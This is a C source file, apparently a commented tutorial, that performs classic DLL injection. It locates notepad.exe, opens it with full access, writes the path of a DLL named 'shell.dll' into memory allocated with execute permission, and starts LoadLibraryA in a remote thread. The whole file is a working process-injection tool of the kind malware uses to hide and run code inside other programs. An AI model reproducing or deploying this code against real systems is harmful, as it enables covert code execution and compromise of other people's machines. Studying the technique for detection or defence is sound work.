#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>

DWORD getProcessID() {
    /*
    * -->  [Declare the required variables]
    */
    // Variable to store the handle to the snapshot 
    HANDLE hProcessSnap;
    // Variable to store the handle to the target process
    HANDLE hProcess;
    // Windows PROCESSENTRY32 structure
    PROCESSENTRY32 pe32;

    //-> Take a snapshot of all the current running processes
    hProcessSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    //-> Set the size of the structure
    pe32.dwSize = sizeof(PROCESSENTRY32);
    	
    //-> Loop throw the structure to find the notepad.exe
    while (Process32Next(hProcessSnap, &pe32)) {
        if (lstrcmpiA("notepad.exe", pe32.szExeFile) == 0) {
            return pe32.th32ProcessID;
        }
    }
	
    //-> Otherwise return zero
    return 0;
}
 
 int main() {
 
	/*
	* -->  [Declare the required variables]
	*/
	// Variable to store the target Process ID
	DWORD pID;
	// Variable to store the handle to the target process
	HANDLE hProcess;
	// Variable to store the base address of the allocated memory
	LPVOID lpBaseAddress;
	// The path of the DLL file that will be injected
	const char* dllPath = "C:\\shell.dll"; // Alter this field
	// Length of the DLL file path
	size_t szDllPath = strlen(dllPath);
	
	/*
	* -->  [Get the ID of the target process]
	* -    User-defined function
	*/
	pID = getProcessID();
	
	/*
	* -->  [Get a handle to the target process]
	* -    Windows API function
	*/
	hProcess = ::OpenProcess(PROCESS_ALL_ACCESS, TRUE, pID);

	//-> If the creation of the handle fails
	if (!hProcess) {
		printf("[Error] [OpenProcess] Couldn't get a handle to the PID: %d\n", pID);
	}
	
	/*
	* -->  [Allocate a memory space at the target process]
	* -    Windows API function
	*/
	lpBaseAddress = ::VirtualAllocEx(hProcess, NULL, szDllPath, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	
	/*
	* -->  [Write the DLL path in the allocated memory space of the target process]
	* -    Windows API function
	*/
	::WriteProcessMemory(hProcess, lpBaseAddress, dllPath, szDllPath, NULL);
	
	/*
	* -->  [Dynamically import the (LoadLibraryA) function from the (kernel32) DLL]
	* -    Windows API functions
	*/
	HMODULE hModule = ::GetModuleHandle(_T("kernel32.dll"));
	FARPROC lpStartAddress = ::GetProcAddress(hModule, "LoadLibraryA");
	
	
	/*
	* -->  [Create a thread at the target process that starts at the LoadLibraryA address]
	* -    Windows API functions
	*/
    HANDLE hThread = ::CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpStartAddress, lpBaseAddress, 0, NULL);
    
    //-> If the thread is created successfully, it will return the handle to the new thread
    if (hThread) {
        printf("[Success] The remote thread created successfully!\n");
    } else {
        printf("[Error] [CreateRemoteThread] The remote thread failed!\n");
    }
  
 }
